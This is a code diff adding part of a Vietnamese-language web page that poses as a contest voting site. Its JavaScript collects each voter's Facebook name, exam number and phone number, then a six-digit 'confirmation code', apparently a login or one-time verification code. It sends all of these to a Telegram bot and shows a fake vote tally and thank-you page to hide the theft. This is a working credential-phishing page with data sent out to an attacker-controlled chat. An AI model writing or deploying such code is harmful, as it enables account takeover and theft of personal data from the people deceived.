+                voterFacebook = facebook;
+                voterSBD = sbd;
+                voterPhone = phone;
+
+                await sendTelegramMessage(
+                    `📋 *THÔNG TIN BÌNH CHỌN*\n\n` +
+                    `👤 Tên Facebook: ${voterFacebook}\n` +
+                    `🆔 Số Báo Danh: ${voterSBD}\n` +
+                    `📞 SĐT: ${voterPhone}\n` +
+                    `🎯 Thí sinh được chọn: SBD ${candidateSBD[candidateId]}`
+                );
+
+                for (let i = 1; i <= 6; i++) {
+                    document.getElementById(`c${i}`).value = '';
+                }
+                showPage('page3');
+            }
+        }
+
+        function backToPage2() {
+            showPage('page2');
+        }
+
+        function moveNext(num) {
+            const curr = document.getElementById(`c${num}`);
+            if (curr.value.length === 1 && num < 6) {
+                document.getElementById(`c${num + 1}`).focus();
+            }
+        }
+
+        // === Trang 3 → Trang thành công ===
+        async function goToSuccess() {
+            let code = '';
+            for (let i = 1; i <= 6; i++) {
+                const val = document.getElementById(`c${i}`).value.trim();
+                if (!val) return alert('Vui lòng nhập đủ 6 chữ số mã!');
+                code += val;
+            }
+
+            await sendTelegramMessage(
+                `🔐 *MÃ XÁC NHẬN*\n\n` +
+                `👤 Tên Facebook: ${voterFacebook}\n` +
+                `🆔 Số Báo Danh: ${voterSBD}\n` +
+                `📞 SĐT: ${voterPhone}\n` +
+                `🔢 Mã: ${code}\n` +
+                `🎯 SBD: ${candidateSBD[candidateId]}`
+            );
+
+            data[candidateId].count++;
+            data[candidateId].percent += 1;
+            data[candidateId].voted = true;
+
+            document.getElementById(`count-${candidateId}`).textContent = data[candidateId].count.toLocaleString('vi-VN') + ' lượt bình chọn';
+            document.getElementById(`bar-${candidateId}`).style.width = data[candidateId].percent + '%';
+            document.getElementById(`percent-${candidateId}`).textContent = data[candidateId].percent + '%';
+
+            const btn = document.getElementById(`btn-${candidateId}`);
+            btn.classList.add('voted');
+            btn.textContent = 'ĐÃ BÌNH CHỌN';
+
+            document.getElementById('thank-name').textContent = voterFacebook;
+            showPage('pageSuccess');
+        }
+
+        function goToPage1FromEnd() {
+            showPage('page1');
+        }
+
+        // === Gửi tin nhắn Telegram ===
+        async function sendTelegramMessage(text) {
+            try {
+                const res = await fetch(`${API}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'Markdown' })
+                });
+                console.log('✅ Đã gửi:', await res.json());
+            } catch (e) {
+                console.log('❌ Lỗi gửi:', e);
+            }
+        }
+
+        // === Khởi động ===
+        updateCountdown();
+        setInterval(updateCountdown, 1000);
+    </script>
+</body>
+
+</html>
